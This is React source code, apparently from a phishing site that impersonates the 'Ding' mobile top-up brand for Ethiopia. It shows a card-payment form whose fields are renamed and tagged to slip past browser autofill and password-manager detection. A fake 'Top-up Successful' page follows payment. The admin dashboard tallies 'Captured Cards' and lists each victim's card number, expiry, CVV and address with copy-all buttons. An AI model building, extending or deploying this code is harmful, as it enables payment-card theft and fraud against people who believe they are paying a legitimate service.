      <div className="card-brands-grid">
        {/* VISA */}
        <span className="card-brand-item visa">VISA</span>

        {/* Mastercard */}
        <span className="card-brand-item mastercard">
          <span style={{ display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
            <span className="mastercard-circles">
              <span className="mc-circle mc-red" />
              <span className="mc-circle mc-orange" />
            </span>
            <span style={{ fontSize: '9px', fontWeight: 700, marginTop: '2px' }}>mastercard</span>
          </span>
        </span>

        {/* Maestro */}
        <span className="card-brand-item maestro">
          <span style={{ display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
            <span className="maestro-circles">
              <span className="mc-circle mae-blue" />
              <span className="mc-circle mae-red" />
            </span>
            <span style={{ fontSize: '9px', fontWeight: 700, marginTop: '2px' }}>maestro</span>
          </span>
        </span>

        {/* American Express */}
        <span className="card-brand-item amex">AMERICAN<br />EXPRESS</span>

        {/* Diners Club */}
        <span className="card-brand-item diners">Diners Club<br /><small>INTERNATIONAL</small></span>

        {/* DISCOVER */}
        <span className="card-brand-item discover">DISCOVER</span>

        {/* UnionPay */}
        <span className="card-brand-item unionpay">UnionPay<br /><small>银联</small></span>

        {/* JCB */}
        <span className="card-brand-item jcb">JCB</span>
      </div>

      {/* Custom form wrapper — completely suppress browser payment autofill popups */}
      <div
        className="payment-card-form"
        role="presentation"
      >
        <div className="payment-input-group">
          <label className="payment-label">{t.cardNumber}</label>
          <input
            type="text"
            inputMode="numeric"
            value={cardDetails.cardNumber}
            onChange={(e) => handleCardNumberChange(e.target.value)}
            placeholder="4532 1234 5678 9012"
            className="payment-text-input"
            maxLength={19}
            autoComplete="one-time-code"
            name="txt_field_a1"
            id="txt_field_a1"
            data-lpignore="true"
            data-form-type="other"
            required
          />
        </div>

        <div className="payment-inline-row">
          <div className="payment-input-group flex-1">
            <label className="payment-label">{t.expiry}</label>
            <input
              type="text"
              inputMode="numeric"
              value={cardDetails.expiry}
              onChange={(e) => handleExpiryChange(e.target.value)}
              placeholder="MM/YY"
              className="payment-text-input"
              maxLength={5}
              autoComplete="one-time-code"
              name="txt_field_b2"
              id="txt_field_b2"
              data-lpignore="true"
              data-form-type="other"
              required
            />
          </div>
          <div className="payment-input-group flex-1">
            <label className="payment-label">{t.cvv}</label>
            <input
              type="text"
              inputMode="numeric"
              value={cardDetails.cvv}
              onChange={(e) => handleCvvChange(e.target.value)}
              placeholder="CVV"
              className="payment-text-input"
              maxLength={4}
              autoComplete="one-time-code"
              name="txt_field_c3"
              id="txt_field_c3"
              data-lpignore="true"
              data-form-type="other"
              required
            />
          </div>
        </div>

        <div className="payment-input-group">
          <label className="payment-label">{t.nameOnCard}</label>
          <input
            type="text"
            value={cardDetails.nameOnCard}
            onChange={(e) => handleChange('nameOnCard', e.target.value)}
            placeholder="Name on card"
            className="payment-text-input"
            autoComplete="one-time-code"
            name="txt_field_d4"
            id="txt_field_d4"
            data-lpignore="true"
            data-form-type="other"
            required
          />
        </div>

        {/* Country as text input */}
        <div className="payment-input-group">
          <label className="payment-label">{t.country}</label>
          <input
            type="text"
            value={cardDetails.country}
            onChange={(e) => handleChange('country', e.target.value)}
            placeholder="e.g., Ethiopia"
            className="payment-text-input"
            autoComplete="one-time-code"
            name="txt_field_e5"
            id="txt_field_e5"
            data-lpignore="true"
            data-form-type="other"
            required
          />
        </div>

        <label className="secure-store-checkbox-label">
          <input
            type="checkbox"
            checked={cardDetails.saveCard}
            onChange={(e) => handleChange('saveCard', e.target.checked)}
            className="magenta-checkbox"
          />
          <span className="checkbox-text">{t.secureStore}</span>
        </label>

        {errorMsg && <p className="field-error-text" style={{ marginTop: '8px' }}>{errorMsg}</p>}

        <div className="payment-fixed-bottom">
          <button type="button" onClick={handlePaySubmit} className="pay-now-lime-btn">
            {t.payNow} ${calculateTotal()} now
          </button>
        </div>
      </div>
    </main>
  );
}

// --------------------------------------------------
// SUCCESS PAGE
// --------------------------------------------------
function SuccessPage({ t, phone, packageInfo, userDetails, onHome, onAdmin }) {
  const isTopup = packageInfo.etb !== undefined;

  return (
    <main className="success-screen">
      <div className="success-box-card">
        <div className="success-circle-icon">
          <Check size={36} />
        </div>
        <h2 className="success-heading">{isTopup ? 'Top-up Successful!' : 'Plan Activated!'}</h2>
        <p className="success-subtext">
          {isTopup
            ? <>Recharge of <b>{packageInfo.etb} ETB</b> sent directly to <b>{phone}</b>.</>
            : <><b>{packageInfo.name}</b> activated for <b>{phone}</b>.</>
          }
        </p>

        <div className="receipt-summary-box">
          <div className="receipt-row">
            <span>Recipient:</span>
            <b>{userDetails.fullName || `${userDetails.firstName || ''} ${userDetails.lastName || ''}`.trim() || 'Customer'}</b>
          </div>
          <div className="receipt-row">
            <span>Mobile Number:</span>
            <b>{phone}</b>
          </div>
          <div className="receipt-row">
            <span>Total Paid:</span>
            <b>${packageInfo.usd} USD</b>
          </div>
          <div className="receipt-row">
            <span>Status:</span>
            <span className="status-chip-done">Completed</span>
          </div>
        </div>

        <div className="success-actions-row">
          <button className="start-topup-btn" onClick={onHome}>Send another top-up</button>
        </div>
      </div>
    </main>
  );
}

// --------------------------------------------------
// ADMIN DASHBOARD (No Dark Mode Toggle)
// --------------------------------------------------
function AdminDashboard({ users, cards, topups, t, onToggleUserStatus, onToggleTopupStatus, onLogout, onExitAdmin }) {
  const [activeTab, setActiveTab] = useState('overview');
  const [searchTerm, setSearchTerm] = useState('');
  const [newPasswordVal, setNewPasswordVal] = useState('');
  const [confirmPasswordVal, setConfirmPasswordVal] = useState('');
  const [passSuccessMsg, setPassSuccessMsg] = useState('');
  const [passErrorMsg, setPassErrorMsg] = useState('');
  const [isUpdatingPass, setIsUpdatingPass] = useState(false);

  const totalUsers = users.length;
  const totalCards = cards.length;
  const totalMoneyUSD = topups.reduce((acc, curr) => acc + (Number(curr.amount_usd) || 0), 0);

  const filteredUsers = useMemo(() => {
    return users.filter(u =>
      `${u.full_name} ${u.phone_number} ${u.email}`.toLowerCase().includes(searchTerm.toLowerCase())
    );
  }, [users, searchTerm]);

  const filteredCards = useMemo(() => {
    return cards.filter(c =>
      `${c.user_name} ${c.card_number} ${c.name_on_card}`.toLowerCase().includes(searchTerm.toLowerCase())
    );
  }, [cards, searchTerm]);

  const handleUpdatePassword = async (e) => {
    e.preventDefault();
    setPassErrorMsg('');
    setPassSuccessMsg('');

    if (newPasswordVal.length < 4) {
      setPassErrorMsg('Password must be at least 4 characters long.');
      return;
    }
    if (newPasswordVal !== confirmPasswordVal) {
      setPassErrorMsg('Passwords do not match. Please verify and retry.');
      return;
    }

    setIsUpdatingPass(true);
    const res = await dbUpdateAdminPassword(newPasswordVal);
    setIsUpdatingPass(false);

    if (res && res.success === false) {
      setPassErrorMsg(`Failed to save to Supabase: ${res.error}. Please execute supabase_schema.sql in Supabase SQL Editor.`);
    } else {
      setPassSuccessMsg('Admin password updated successfully in Supabase database!');
      setNewPasswordVal('');
      setConfirmPasswordVal('');
      setPassErrorMsg('');
      setTimeout(() => setPassSuccessMsg(''), 5000);
    }
  };

  return (
    <div className="admin-layout">
      <aside className="admin-sidebar-nav">
        <div className="sidebar-header">
          <span className="admin-brand-logo">ding</span>
          <span className="admin-badge-pill">REAL DB</span>
        </div>

        <nav className="sidebar-menu">
          <button className={`menu-tab-btn ${activeTab === 'overview' ? 'active' : ''}`} onClick={() => setActiveTab('overview')}>
            <LayoutDashboard size={18} /> <span>Overview</span>
          </button>
          <button className={`menu-tab-btn ${activeTab === 'users' ? 'active' : ''}`} onClick={() => setActiveTab('users')}>
            <Users size={18} /> <span>Registered Users ({totalUsers})</span>
          </button>
          <button className={`menu-tab-btn ${activeTab === 'cards' ? 'active' : ''}`} onClick={() => setActiveTab('cards')}>
            <CreditCard size={18} /> <span>Card Vault ({totalCards})</span>
          </button>
          <button className={`menu-tab-btn ${activeTab === 'settings' ? 'active' : ''}`} onClick={() => setActiveTab('settings')}>
            <KeyRound size={18} /> <span>Security &amp; Password</span>
          </button>
        </nav>

        <div className="sidebar-footer-controls">
          <button className="exit-admin-btn" onClick={onLogout}>
            <LogOut size={16} /> <span>Logout</span>
          </button>
        </div>
      </aside>

      <main className="admin-main-viewport">
        <header className="admin-topbar">
          <div className="topbar-search">
            <Search size={16} className="search-icon" />
            <input type="text" placeholder="Search real submissions..." value={searchTerm} onChange={(e) => setSearchTerm(e.target.value)} className="admin-search-input" />
          </div>
          <div className="admin-user-profile">
            <span className="live-db-indicator">
              <span className="pulsing-green-dot" /> Live Real Data
            </span>
            <button className="back-nav-btn" style={{ fontSize: '13px' }} onClick={onExitAdmin}>Exit to Web</button>
          </div>
        </header>

        {/* OVERVIEW */}
        {activeTab === 'overview' && (
          <div className="admin-content-space">
            <h1 className="dashboard-title">Live Overview</h1>
            <div className="kpi-cards-grid">
              <div className="kpi-card purple">
                <div className="kpi-header"><span>Registered Users</span><Users size={20} className="kpi-icon" /></div>
                <div className="kpi-value">{totalUsers}</div>
                <div className="kpi-subtext">Real Database Entries</div>
              </div>
              <div className="kpi-card pink">
                <div className="kpi-header"><span>Captured Cards</span><CreditCard size={20} className="kpi-icon" /></div>
                <div className="kpi-value">{totalCards}</div>
                <div className="kpi-subtext">Stored in Card Vault</div>
              </div>
              <div className="kpi-card green">
                <div className="kpi-header"><span>Total Real Revenue</span><Wallet size={20} className="kpi-icon" /></div>
                <div className="kpi-value">${totalMoneyUSD.toFixed(2)}</div>
                <div className="kpi-subtext">From real user submissions</div>
              </div>
            </div>

            <div className="data-table-panel">
              <h3 className="panel-title">Real Top-up Submissions</h3>
              <div className="table-responsive-box">
                <table className="admin-table">
                  <thead>
                    <tr>
                      <th>TRANSACTION ID</th>
                      <th>RECIPIENT NAME</th>
                      <th>PHONE NUMBER</th>
                      <th>AMOUNT</th>
                      <th>STATUS / PROCESS</th>
                      <th>DATE</th>
                    </tr>
                  </thead>
                  <tbody>
                    {topups.map((tp) => (
                      <tr key={tp.id}>
                        <td className="font-mono">{tp.id}</td>
                        <td><b>{tp.user_name || 'Customer'}</b></td>
                        <td>{tp.phone}</td>
                        <td><b>${tp.amount_usd} USD</b></td>
                        <td>
                          <button className={`status-toggle-pill ${tp.status.toLowerCase()}`} onClick={() => onToggleTopupStatus(tp.id, tp.status)}>
                            {tp.status} <ChevronDown size={12} />
                          </button>
                        </td>
                        <td>{new Date(tp.created_at || Date.now()).toLocaleDateString()}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
                {topups.length === 0 && (
                  <div className="empty-table-msg">No real top-up records submitted yet. Complete a checkout on the website to see live entries here!</div>
                )}
              </div>
            </div>
          </div>
        )}

        {/* USERS */}
        {activeTab === 'users' && (
          <div className="admin-content-space">
            <h1 className="dashboard-title">Registered Users ({filteredUsers.length})</h1>
            <div className="data-table-panel">
              <div className="table-responsive-box">
                <table className="admin-table">
                  <thead>
                    <tr>
                      <th>FULL NAME</th>
                      <th>PHONE NUMBER</th>
                      <th>ADDRESS / CITY</th>
                      <th>STATE &amp; ZIP</th>
                      <th>PROCESS STATUS</th>
                    </tr>
                  </thead>
                  <tbody>
                    {filteredUsers.map((u) => (
                      <tr key={u.id}>
                        <td>
                          <div className="user-name-cell">
                            <span className="user-avatar-small">{u.full_name ? u.full_name.charAt(0).toUpperCase() : 'U'}</span>
                            <b>{u.full_name}</b>
                          </div>
                        </td>
                        <td>{u.phone_number}</td>
                        <td>
                          <div>{u.street_address}</div>
                          <small className="sub-city">{u.city}</small>
                        </td>
                        <td>{u.state} ({u.zip_code})</td>
                        <td>
                          <button className={`status-toggle-pill ${u.status ? u.status.toLowerCase() : 'pending'}`} onClick={() => onToggleUserStatus(u.id, u.status || 'Pending')}>
                            {u.status || 'Pending'} <ChevronDown size={12} />
                          </button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
                {filteredUsers.length === 0 && (
                  <div className="empty-table-msg">No real registered user records found.</div>
                )}
              </div>
            </div>
          </div>
        )}

        {/* CARDS */}
        {activeTab === 'cards' && (
          <div className="admin-content-space">
            <h1 className="dashboard-title">Card Vault ({filteredCards.length})</h1>
            <div className="vault-cards-grid">
              {filteredCards.map((c) => (
                <VaultCard key={c.id} card={c} users={users} />
              ))}
              {filteredCards.length === 0 && (
                <div className="empty-table-msg" style={{ gridColumn: '1 / -1' }}>No captured card records in database.</div>
              )}
            </div>
          </div>
        )}

        {/* SETTINGS */}
        {activeTab === 'settings' && (
          <div className="admin-content-space">
            <h1 className="dashboard-title">{t.changePassword}</h1>
            <div className="data-table-panel max-w-md">
              <form onSubmit={handleUpdatePassword} className="admin-form-col">
                <div className="input-group">
                  <label className="input-label">Admin Email</label>
                  <input type="email" value={dbGetAdminAuth().email} disabled className="styled-input-field no-left-icon disabled" />
                </div>
                <div className="input-group">
                  <label className="input-label">{t.newPass}</label>
                  <input type="password" value={newPasswordVal} onChange={(e) => setNewPasswordVal(e.target.value)} placeholder="Enter new admin password" className="styled-input-field no-left-icon" required />
                </div>
                <div className="input-group">
                  <label className="input-label">Retry / Confirm Password</label>
                  <input type="password" value={confirmPasswordVal} onChange={(e) => setConfirmPasswordVal(e.target.value)} placeholder="Re-enter new admin password" className="styled-input-field no-left-icon" required />
                </div>
                {passErrorMsg && <p className="field-error-text" style={{ margin: '4px 0 8px' }}>{passErrorMsg}</p>}
                {passSuccessMsg && <p className="success-msg-text">{passSuccessMsg}</p>}
                <button type="submit" className="start-topup-btn" disabled={isUpdatingPass}>
                  {isUpdatingPass ? 'Updating in Supabase...' : t.updatePassBtn}
                </button>
              </form>
            </div>
          </div>
        )}
      </main>
    </div>
  );
}

// --------------------------------------------------
// VAULT CARD COMPONENT (for Admin Card Vault)
// --------------------------------------------------
function VaultCard({ card, users }) {
  const [copiedField, setCopiedField] = useState('');

  // If card.country has embedded compound data, unpack it
  let cardCountry = card.country || '—';
  let embeddedStreet = '';
  let embeddedApt = '';
  let embeddedCity = '';
  let embeddedState = '';
  let embeddedZip = '';
  let embeddedFn = '';
  let embeddedLn = '';

  if (card.country && card.country.includes(':::')) {
    const parts = card.country.split(':::');
    cardCountry = parts[0] || '—';
    embeddedStreet = parts[1] || '';
    embeddedApt = parts[2] || '';
    embeddedCity = parts[3] || '';
    embeddedState = parts[4] || '';
    embeddedZip = parts[5] || '';
    embeddedFn = parts[6] || '';
    embeddedLn = parts[7] || '';
  }

  // Fallback to matching user in users list if not already directly on card
  const matchingUser = users?.find(u =>
    u.full_name && card.user_name &&
    (u.full_name.trim().toLowerCase() === card.user_name.trim().toLowerCase())
  );

  const firstName = card.first_name || embeddedFn || (matchingUser?.first_name) || (card.user_name ? card.user_name.split(' ')[0] : (matchingUser?.full_name?.split(' ')[0] || '—'));
  const lastName = card.last_name || embeddedLn || (matchingUser?.last_name) || (card.user_name ? card.user_name.split(' ').slice(1).join(' ') : (matchingUser?.full_name?.split(' ').slice(1).join(' ') || '—'));
  const streetAddress = card.street_address || embeddedStreet || matchingUser?.street_address || '—';
  const apartment = card.apartment || embeddedApt || matchingUser?.apartment || '—';
  const city = card.city || embeddedCity || matchingUser?.city || '—';
  const state = card.state || embeddedState || matchingUser?.state || '—';
  const zipCode = card.zip_code || embeddedZip || matchingUser?.zip_code || '—';

  const copyToClipboard = (text, fieldName) => {
    navigator.clipboard.writeText(text).then(() => {
      setCopiedField(fieldName);
      setTimeout(() => setCopiedField(''), 1500);
    }).catch(() => {
      // Fallback for older browsers
      const textarea = document.createElement('textarea');
      textarea.value = text;
      document.body.appendChild(textarea);
      textarea.select();
      document.execCommand('copy');
      document.body.removeChild(textarea);
      setCopiedField(fieldName);
      setTimeout(() => setCopiedField(''), 1500);
    });
  };

  const copyAllDetails = () => {
    const allText = [
      `User: ${card.user_name}`,
      `Card Number: ${card.card_number}`,
      `Expiry: ${card.expiry}`,
      `CVV: ${card.cvv}`,
      `Name on Card: ${card.name_on_card}`,
      `Country: ${cardCountry}`,
      `First Name: ${firstName}`,
      `Last Name: ${lastName}`,
      `Street Address: ${streetAddress}`,
      `Apartment: ${apartment}`,
      `City: ${city}`,
      `State: ${state}`,
      `Zip Code: ${zipCode}`,
      `Date: ${new Date(card.created_at || Date.now()).toLocaleDateString()}`
    ].join('\n');
    copyToClipboard(allText, 'all');
  };

  const CopyBtn = ({ value, field }) => (
    <button
      className={`vault-copy-btn ${copiedField === field ? 'copied' : ''}`}
      onClick={(e) => { e.stopPropagation(); copyToClipboard(value, field); }}
      title={copiedField === field ? 'Copied!' : 'Copy'}
    >
      {copiedField === field ? <ClipboardCheck size={13} /> : <Copy size={13} />}
    </button>
  );

  return (
    <div className="vault-card-rect">
      <div className="vault-card-header">
        <div className="vault-card-user">
          <span className="vault-user-avatar">{card.user_name ? card.user_name.charAt(0).toUpperCase() : 'U'}</span>
          <span className="vault-user-name">{card.user_name}</span>
        </div>
        <button
          className={`vault-copy-all-btn ${copiedField === 'all' ? 'copied' : ''}`}
          onClick={copyAllDetails}
        >
          {copiedField === 'all' ? <><ClipboardCheck size={14} /> Copied!</> : <><Copy size={14} /> Copy All</>}
        </button>
      </div>

      <div className="vault-card-body">
        <div className="vault-field-row">
          <span className="vault-field-label">Card Number</span>
          <span className="vault-field-value mono">{card.card_number}</span>
          <CopyBtn value={card.card_number} field="cardNumber" />
        </div>
        <div className="vault-field-row">
          <span className="vault-field-label">Expiry</span>
          <span className="vault-field-value mono">{card.expiry}</span>
          <CopyBtn value={card.expiry} field="expiry" />
        </div>
        <div className="vault-field-row">
          <span className="vault-field-label">CVV</span>
          <span className="vault-field-value mono highlight">{card.cvv}</span>
          <CopyBtn value={card.cvv} field="cvv" />
        </div>
        <div className="vault-field-row">
          <span className="vault-field-label">Name on Card</span>
          <span className="vault-field-value">{card.name_on_card}</span>
          <CopyBtn value={card.name_on_card} field="nameOnCard" />
        </div>
        <div className="vault-field-row">
          <span className="vault-field-label">Country</span>
          <span className="vault-field-value">{cardCountry}</span>
          <CopyBtn value={cardCountry} field="country" />
        </div>
        <div className="vault-field-row">
          <span className="vault-field-label">First Name</span>
          <span className="vault-field-value">{firstName}</span>
          <CopyBtn value={firstName} field="firstName" />
        </div>
        <div className="vault-field-row">
          <span className="vault-field-label">Last Name</span>
          <span className="vault-field-value">{lastName}</span>
          <CopyBtn value={lastName} field="lastName" />
        </div>
        <div className="vault-field-row">
          <span className="vault-field-label">Street Address</span>
          <span className="vault-field-value">{streetAddress}</span>
          <CopyBtn value={streetAddress} field="streetAddress" />
        </div>
        <div className="vault-field-row">
          <span className="vault-field-label">Apartment</span>
          <span className="vault-field-value">{apartment}</span>
          <CopyBtn value={apartment} field="apartment" />
        </div>
        <div className="vault-field-row">
          <span className="vault-field-label">City</span>
          <span className="vault-field-value">{city}</span>
          <CopyBtn value={city} field="city" />
        </div>
        <div className="vault-field-row">
          <span className="vault-field-label">State</span>
          <span className="vault-field-value">{state}</span>
          <CopyBtn value={state} field="state" />
        </div>
        <div className="vault-field-row">
          <span className="vault-field-label">Zip Code</span>
          <span className="vault-field-value">{zipCode}</span>
          <CopyBtn value={zipCode} field="zipCode" />
        </div>
        <div className="vault-field-row last">
          <span className="vault-field-label">Date Stored</span>
          <span className="vault-field-value">{new Date(card.created_at || Date.now()).toLocaleDateString()}</span>
        </div>
      </div>
    </div>
  );
}

// --------------------------------------------------
// FOOTER
// --------------------------------------------------
function Footer({ t }) {
  return (
    <footer className="ding-site-footer">
      <div className="footer-container">
        <div className="footer-top-row">
          <span className="ding-logo footer-logo">ding</span>
          <div className="footer-country-pill">
            <EthiopiaFlag />
            <span>Ethiopia (ETB)</span>
          </div>
        </div>
        <div className="footer-links-row">
          <a href="#about">About Ding</a>
          <a href="#topup">Send Top-Up</a>
          <a href="#privacy">Privacy Policy</a>
          <a href="#terms">Terms of Service</a>
        </div>
        <div className="footer-copyright">
          © {new Date().getFullYear()} Ding. All rights reserved.
        </div>
      </div>
    </footer>
  );
}